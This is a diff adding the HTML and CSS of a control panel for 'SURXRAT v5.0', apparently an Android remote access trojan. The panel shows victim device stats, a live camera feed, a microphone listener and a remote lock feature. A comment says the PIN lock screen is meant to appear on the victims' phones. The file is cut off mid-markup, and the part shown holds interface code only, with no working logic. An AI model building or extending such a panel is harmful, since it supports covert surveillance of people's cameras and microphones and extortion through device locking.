@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SURXRAT v5.0 | PANEL</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;900&display=swap');
+        
+        * {
+            font-family: 'Orbitron', monospace;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: #000000;
+            color: #00FF00;
+            overflow-x: hidden;
+            background-image: 
+                linear-gradient(rgba(0, 255, 0, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 0, 0.03) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        .scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                to bottom,
+                rgba(0, 0, 0, 0) 0%,
+                rgba(0, 255, 0, 0.08) 50%,
+                rgba(0, 0, 0, 0) 100%
+            );
+            animation: scanline 4s linear infinite;
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        @keyframes scanline {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+
+        .glitch {
+            animation: glitch 1s linear infinite;
+        }
+
+        @keyframes glitch {
+            2%,64%{ transform: translate(2px,0) skew(0deg); }
+            4%,60%{ transform: translate(-2px,0) skew(0deg); }
+            62%{ transform: translate(0,0) skew(5deg); }
+        }
+
+        .terminal-box {
+            border: 2px solid #00FF00;
+            background-color: #0a0a0a;
+            box-shadow: 0 0 15px rgba(0,255,0,0.3), inset 0 0 15px rgba(0,255,0,0.1);
+        }
+
+        .btn-surx {
+            background-color: #111;
+            border: 2px solid #00FF00;
+            color: #00FF00;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        .btn-surx:hover, .btn-surx.active {
+            background-color: #00FF00;
+            color: #000;
+            box-shadow: 0 0 10px #00FF00;
+        }
+
+        .btn-danger {
+            border-color: red;
+            color: red;
+        }
+
+        .btn-danger:hover, .btn-danger.active {
+            background-color: red;
+            color: white;
+            box-shadow: 0 0 10px red;
+        }
+
+        .status-online {
+            color: #00FF00;
+            text-shadow: 0 0 5px #00FF00;
+        }
+
+        .blink {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        #realCam {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+            transform: scaleX(-1);
+            border: 2px solid #00FF00;
+        }
+
+        .rec-dot {
+            width: 15px;
+            height: 15px;
+            background: red;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+            box-shadow: 0 0 10px red;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.5; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        input {
+            background: #111;
+            border: 2px solid #0f0;
+            color: #0f0;
+            padding: 10px;
+            border-radius: 5px;
+            width: 150px;
+            text-align: center;
+            font-size: 18px;
+        }
+
+        /* STYLE LAYAR KUNCI */
+        .lock-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 999999;
+        }
+        .red-line {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            width: 2px;
+            height: 100%;
+            background: red;
+            box-shadow: 0 0 10px red;
+            transform: translateX(-50%);
+        }
+        .lock-icon {
+            text-align: center;
+            margin-top: 20%;
+        }
+        .lock-icon i {
+            font-size: 80px;
+            color: red;
+            text-shadow: 0 0 20px red;
+        }
+        .title {
+            text-align: center;
+            color: white;
+            font-size: 24px;
+            margin: 20px 0;
+            text-shadow: 0 0 10px red;
+        }
+        .pin-input {
+            width: 60%;
+            height: 50px;
+            background: #111;
+            border: none;
+            border-bottom: 2px solid red;
+            color: white;
+            font-size: 24px;
+            text-align: center;
+            margin: 0 auto;
+            display: block;
+            outline: none;
+        }
+        .keypad {
+            position: absolute;
+            bottom: 50px;
+            width: 100%;
+            padding: 0 20px;
+        }
+        .row {
+            display: flex;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        .key {
+            width: 70px;
+            height: 70px;
+            background: #1a1a1a;
+            color: white;
+            font-size: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 20px;
+            border: 1px solid #333;
+        }
+        .wrong {
+            animation: shake 0.5s;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+    </style>
+</head>
+<body>
+    <div class="scanline"></div>
+
+    <!-- LAYAR KUNCI YANG AKAN MUNCUL DI HP MEREKA -->
+    <div class="lock-overlay" id="lockScreen">
+        <div class="red-line"></div>
+        <div class="lock-icon">
+            <i class="fas fa-lock"></i>
+        </div>
+        <div class="title">LOCK BY SURXRAT</div>
+        <input type="password" class="pin-input" id="pinBox" placeholder="••••" maxlength="4" readonly>
+        
+        <div class="keypad">
+            <div class="row">
+                <div class="key" data-num="1">1</div>
+                <div class="key" data-num="2">2</div>
+                <div class="key" data-num="3">3</div>
+            </div>
+            <div class="row">
+                <div class="key" data-num="4">4</div>
+                <div class="key" data-num="5">5</div>
+                <div class="key" data-num="6">6</div>
+            </div>
+            <div class="row">
+                <div class="key" data-num="7">7</div>
+                <div class="key" data-num="8">8</div>
+                <div class="key" data-num="9">9</div>
+            </div>
+            <div class="row">
+                <div class="key" data-num="0">0</div>
+                <div class="key" id="delKey"><i class="fas fa-backspace"></i></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container mx-auto px-4 py-6 max-w-6xl">
+        
+        <header class="text-center mb-8">
+            <h1 class="text-6xl font-black glitch mb-2 text-red-600">SURXRAT <span class="text-green-500">v5.0</span></h1>
+            <p class="text-lg text-green-400">REMOTE ADMINISTRATION TOOL | MASTER MODE</p>
+            <p class="text-sm mt-2">STATUS: <span class="status-online font-bold blink" id="statusText">ONLINE</span></p>
+        </header>
+
+        <!-- STATUS & CONNECT -->
+        <div class="terminal-box p-4 mb-6 rounded-lg text-center">
+            <h3 class="text-xl mb-2">DEVICE STATUS</h3>
+            <p class="text-3xl font-bold text-yellow-400 blink" id="deviceStatus">NOT CONNECTED</p>
+            <button class="btn-surx px-8 py-3 rounded mt-4 text-xl" id="connectBtn">
+                <i class="fas fa-power-off"></i> ACTIVATE CONNECTION
+            </button>
+        </div>
+
+        <!-- MENU TAB -->
+        <div class="flex flex-wrap justify-center gap-2 mb-6">
+            <button class="tab-btn btn-surx px-6 py-2 rounded active" data-tab="dashboard">DASHBOARD</button>
+            <button class="tab-btn btn-surx px-6 py-2 rounded" data-tab="camera">CAMERA</button>
+            <button class="tab-btn btn-surx px-6 py-2 rounded" data-tab="mic">MIC</button>
+            <button class="tab-btn btn-danger px-6 py-2 rounded" data-tab="locker">LOCK SYSTEM</button>
+        </div>
+
+        <div class="terminal-box p-6 rounded-lg min-h-[500px]">
+            
+            <!-- DASHBOARD -->
+            <div id="dashboard" class="tab-content active">
+                <h2 class="text-2xl font-bold mb-4 border-b border-green-600 pb-2">DEVICE STATISTICS</h2>
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
+                    <div class="bg-black p-4 rounded text-center border border-green-700">
+                        <i class="fas fa-microchip text-3xl mb-2"></i>
+                        <h3 class="text-sm">CPU USAGE</h3>
+                        <p class="text-xl font-bold" id="cpuVal">--%</p>
+                    </div>
+                    <div class="bg-black p-4 rounded text-center border border-green-700">
+                        <i class="fas fa-memory text-3xl mb-2"></i>
+                        <h3 class="text-sm">RAM USAGE</h3>
+                        <p class="text-xl font-bold" id="ramVal">-- MB</p>
+                    </div>
+                    <div class="bg-black p-4 rounded text-center border border-green-700">
+                        <i class="fas fa-battery-full text-3xl mb-2"></i>
+                        <h3 class="text-sm">BATTERY</h3>
+                        <p class="text-xl font-bold" id="batVal">--%</p>
+                    </div>
+                    <div class="bg-black p-4 rounded text-center border border-green-700">
+                        <i class="fas fa-signal text-3xl mb-2"></i>
+                        <h3 class="text-sm">SIGNAL</h3>
+                        <p class="text-xl font-bold" id="sigVal">--%</p>
+                    </div>
+                </div>
+
+                <h3 class="text-xl font-bold mb-3">DEVICE INFORMATION</h3>
+                <div class="bg-black p-4 rounded border border-green-700 text-sm space-y-2">
+                    <p>> DEVICE MODEL: <span id="devModel">WAITING...</span></p>
+                    <p>> ANDROID VERSION: <span id="androidVer">WAITING...</span></p>
+                    <p>> SIM CARD: <span id="simCard">WAITING...</span></p>
+                </div>
+            </div>
+
+            <!-- CAMERA -->
+            <div id="camera" class="tab-content">
+                <h2 class="text-2xl font-bold mb-4 border-b border-green-600 pb-2">LIVE CAMERA FEED</h2>
+                <div class="relative border-4 border-green-600 rounded-lg overflow-hidden bg-black aspect-video">
+                    <video id="realCam" autoplay playsinline muted></video>
+                    <div class="absolute top-4 left-4 flex items-center gap-2" id="recIndicator" style="display:none">
+                        <div class="rec-dot"></div>
+                        <span class="text-red-500 font-bold text-xl">LIVE</span>
+                    </div>
+                </div>
+                <div class="flex justify-center gap-4 mt-4">
+                    <button class="btn-surx px-6 py-3 rounded" id="startCamBtn">START CAMERA</button>
+                </div>
+            </div>
+
+            <!-- MIC -->
+            <div id="mic" class="tab-content">
+                <h2 class="text-2xl font-bold mb-4 border-b border-green-600 pb-2">AUDIO LISTENER</h2>
+                <div class="text-center py-10">
+                    <i class="fas fa-microphone text-8xl mb-6 text-green-500"></i>
+                    <p class="text-xl mb-6">STATUS: <span class="text-green-500 font-bold" id="micStatus">READY</span></p>
+                </div>
+            </div>
+
+            <!-- LOCK SYSTEM -->
+            <div id="locker" class="tab-content">
+                <h2 class="text-2xl font-bold mb-4 border-b border-red-600 pb-2 text-red-500">REMOTE LOCK SYSTEM</h2>
+                
+                <div class="bg-black p-6 rounded border border-red-700 text-center">
+                    <i class="fas fa-lock
